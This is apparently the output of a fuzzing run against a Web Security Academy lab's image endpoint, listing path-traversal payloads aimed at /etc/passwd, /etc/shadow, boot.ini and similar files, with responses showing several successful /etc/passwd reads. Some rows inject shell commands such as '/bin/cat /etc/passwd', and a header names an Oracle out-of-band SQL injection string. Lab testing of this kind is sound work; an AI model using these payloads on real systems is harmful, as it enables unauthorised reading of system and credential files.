id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,58,%2e%2e%2f%2e%68%74%61%63%63%65%73%73,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,59,%2e%68%74%61%63%63%65%73%73,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,60,%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,61,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,62,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,63,%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,64,%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,65,%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,66,../../../../../../../../../../../../etc/hosts%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/hosts%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,67,../../../../../../../../../../../../etc/hosts,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/hosts,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,173
id_fuzz_1,68,../../boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,69,/../../../../../../../../%2A,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../%2A,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,70,../../../../../../../../../../../../etc/passwd%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,71,../../../../../../../../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,72,../../../../../../../../../../../../etc/shadow%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,73,../../../../../../../../../../../../etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,74,/../../../../../../../../../../etc/passwd^^,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../etc/passwd^^,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,75,/../../../../../../../../../../etc/shadow^^,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../etc/shadow^^,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,76,/../../../../../../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,77,/../../../../../../../../../../etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,78,/./././././././././././etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/./././././././././././etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,79,/./././././././././././etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/./././././././././././etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,80,\..\..\..\..\..\..\..\..\..\..\etc\passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,81,\..\..\..\..\..\..\..\..\..\..\etc\shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,82,..\..\..\..\..\..\..\..\..\..\etc\passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,83,..\..\..\..\..\..\..\..\..\..\etc\shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,84,/..\../..\../..\../..\../..\../..\../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/..\../..\../..\../..\../..\../..\../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,85,/..\../..\../..\../..\../..\../..\../etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/..\../..\../..\../..\../..\../..\../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,86,.\./.\./.\./.\./.\./.\./etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=.\./.\./.\./.\./.\./.\./etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,87,.\./.\./.\./.\./.\./.\./etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=.\./.\./.\./.\./.\./.\./etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,88,\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,89,\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,90,..\..\..\..\..\..\..\..\..\..\etc\passwd%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,91,..\..\..\..\..\..\..\..\..\..\etc\shadow%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,92,%0a/bin/cat%20/etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%0a/bin/cat%20/etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,93,%0a/bin/cat%20/etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%0a/bin/cat%20/etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,94,%00/etc/passwd%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%00/etc/passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,95,%00/etc/shadow%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%00/etc/shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,96,%00../../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%00../../../../../../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,97,%00../../../../../../etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%00../../../../../../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,98,/../../../../../../../../../../../etc/passwd%00.jpg,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../../etc/passwd%00.jpg,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,99,/../../../../../../../../../../../etc/passwd%00.html,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../../etc/passwd%00.html,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,100,/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,101,/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,102,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,103,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,104,%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,105,/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,106,%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,107,/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,108,\&apos;/bin/cat%20/etc/passwd\&apos;,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\&apos;/bin/cat%20/etc/passwd\&apos;,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,109,\&apos;/bin/cat%20/etc/shadow\&apos;,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\&apos;/bin/cat%20/etc/shadow\&apos;,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,110,../../../../../../../../conf/server.xml,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../conf/server.xml,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,111,/../../../../../../../../bin/id|,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../bin/id|,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,112,C:/inetpub/wwwroot/global.asa,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=C:/inetpub/wwwroot/global.asa,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,113,C:\inetpub\wwwroot\global.asa,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=C:\inetpub\wwwroot\global.asa,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,114,C:/boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=C:/boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,115,C:oot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=C:oot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,116,../../../../../../../../../../../../localstart.asp%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../localstart.asp%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,117,../../../../../../../../../../../../localstart.asp,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../localstart.asp,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,118,../../../../../../../../../../../../boot.ini%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../boot.ini%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,119,../../../../../../../../../../../../boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../../../../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,120,/./././././././././././boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/./././././././././././boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,121,/../../../../../../../../../../../boot.ini%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,122,/../../../../../../../../../../../boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,123,/..\../..\../..\../..\../..\../..\../boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/..\../..\../..\../..\../..\../..\../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,124,/.\./.\./.\./.\./.\./.\./boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/.\./.\./.\./.\./.\./.\./boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,125,\..\..\..\..\..\..\..\..\..\..oot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..oot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,126,..\..\..\..\..\..\..\..\..\..oot.ini%00,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..oot.ini%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,127,..\..\..\..\..\..\..\..\..\..oot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..oot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,128,/../../../../../../../../../../../boot.ini%00.html,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini%00.html,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,129,/../../../../../../../../../../../boot.ini%00.jpg,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini%00.jpg,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,130,/.../.../.../.../.../,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/.../.../.../.../.../,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,131,..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,132,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
